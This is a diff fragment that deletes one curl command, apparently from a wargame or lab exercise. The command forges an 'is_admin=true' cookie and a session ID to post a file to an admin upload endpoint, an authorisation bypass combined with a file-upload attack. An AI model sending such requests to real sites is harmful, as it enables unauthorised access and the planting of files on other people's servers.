@@ -1,1 +1,0 @@
-curl -X POST -F "file=index.php1" -b "is_admin=true; PHPSESSID=j93es2" http://edu.arang.kr:8080/admin/upload.php
